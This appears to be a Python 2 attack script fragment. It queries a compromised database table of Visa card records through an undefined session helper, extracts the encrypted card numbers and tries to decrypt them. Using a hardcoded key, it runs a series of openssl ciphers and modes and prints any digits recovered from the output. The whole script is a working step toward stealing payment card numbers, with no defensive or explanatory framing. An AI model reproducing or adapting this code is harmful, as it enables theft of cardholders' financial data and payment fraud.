
import subprocess
KEY='8L84j3x3yZY894gyEwFNhDSPSrfyHf9WA'
K16=KEY[:16].encode('hex')
K24=KEY[:24].encode('hex')
K32=KEY[:32].encode('hex')
print 'K16=%s'%K16
print 'K32=%s'%K32
rows=do_query(s,"SELECT id,HEX(FROM_BASE64(numero)) FROM datostarjeta WHERE tipo='Visa' ORDER BY id DESC LIMIT 5")
print 'Got %d rows'%len(rows)
for row in rows:
    rid=row[0]
    hx=row[1]
    raw=hx.decode('hex')
    ts=raw[:4].encode('hex')
    rep=raw[4:8].encode('hex')
    ct=raw[8:]
    cth=ct.encode('hex')
    print 'ID=%s ts=%s rep=%s ct=%s'%(rid,ts,rep,cth)
    f=open('/tmp/ct.bin','wb')
    f.write(ct)
    f.close()
    tests=[
        ('aes-128-ecb',K16,''),
        ('aes-256-ecb',K32,''),
        ('bf-ecb',K16,''),
        ('cast5-ecb',K16,''),
        ('aes-128-cbc',K16,raw[:8].encode('hex')+'0'*16),
        ('bf-cbc',K16,raw[:8].encode('hex')),
        ('bf-cbc',K16,rep),
    ]
    for t in tests:
        cipher,key,iv=t
        if 'ecb' in cipher:
            cmd='openssl enc -%s -d -nosalt -nopad -K %s -in /tmp/ct.bin'%(cipher,key)
        else:
            cmd='openssl enc -%s -d -nosalt -nopad -K %s -iv %s -in /tmp/ct.bin'%(cipher,key,iv)
        p=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        o,e=p.communicate()
        if p.returncode==0 and len(o)>0:
            nums=''.join(c for c in o if c.isdigit())
            asc=''.join(c if 32<=ord(c)<127 else '.' for c in o)
            print '  %s k=%s: nums=%s asc=%s hex=%s'%(cipher,key[:8],nums,asc,o.encode('hex'))
        else:
            em=(e or '').strip().split('\n')[-1][:40] if e else ''
            print '  %s k=%s FAIL:%s'%(cipher,key[:8],em)
    print ''
s.close()
